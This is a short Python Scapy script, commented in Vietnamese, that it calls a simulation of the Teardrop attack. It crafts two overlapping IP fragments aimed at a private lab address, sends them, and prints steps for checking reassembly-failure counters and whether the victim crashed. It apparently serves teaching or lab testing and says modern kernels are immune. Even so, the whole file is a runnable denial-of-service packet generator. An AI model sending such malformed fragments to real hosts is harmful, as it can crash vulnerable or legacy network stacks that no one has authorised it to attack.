#!/usr/bin/env python3
# teardrop_attack.py - Mo phong tan cong phan manh IP chong lan (Teardrop Attack)
import sys
import time
from scapy.all import *

victim_ip = "10.0.0.2"
ipid = 1234  # Identification dung de kernel ben nhan biet cac manh cung mot goi

print("==================================================================")
print("[*] TAN CONG TEARDROP ATTACK (OVERLAPPING IP FRAGMENTS)")
print("==================================================================")
print(f"[*] Muc tieu nan nhan (Victim):       {victim_ip}")
print(f"[*] IP Identification (ID goi):       {ipid}")
print(f"[*] Giao thuc mang theo (Protocol):    17 (UDP)")
print("==================================================================")

# 1. Manh 1 (Fragment 1):
# - frag=0: Bat dau tu byte 0
# - flags="MF": More Fragments (Bao rang van con manh tiep theo phia sau)
# - Payload: 24 byte 'A' (tuong duong 3 khoi 8-byte, chiem tu byte 0 den 23)
f1 = IP(dst=victim_ip, id=ipid, flags="MF", frag=0, proto=17) / (b"A" * 24)

# 2. Manh 2 (Fragment 2) - MANH CHONG LAN (OVERLAPPING):
# - frag=1: Don vi offset = 8 byte -> Manh 2 bat dau tu byte 8!
#   ==> Khoang tu byte 8 den 23 bi CHONG LAN (Overlap) voi Manh 1!
# - flags=0: Khong con co MF (Day la manh cuoi cung)
# - Payload: 24 byte 'B' (chiem tu byte 8 den 31)
f2 = IP(dst=victim_ip, id=ipid, flags=0, frag=1, proto=17) / (b"B" * 24)

print("[*] Thong tin chi tiet cac manh IP duoc che tao:")
print("    - Manh 1: Offset = 0 (Byte 0..23), Co MF = 1 (Con manh)")
print("    - Manh 2: Offset = 1 (Byte 8..31), Co MF = 0 (Manh cuoi)")
print("    ==> Vung chong lan (Overlap): Byte 8 den Byte 23 (16 byte bi de len nhau!)")
print("==================================================================")

print(f"[*] Dang ban 2 manh IP chong lan toi {victim_ip}...")
send([f1, f2], verbose=0)

print("[+] DA GUI THANH CONG!")
print("    -> Hay kiem tra thong ke ReasmFails tai Victim: cat /proc/net/snmp | grep -A1 '^Ip:'")
print("    -> Kiem tra xem Victim co bi crash khong (Kernel hien dai se mien nhiem 100%).")

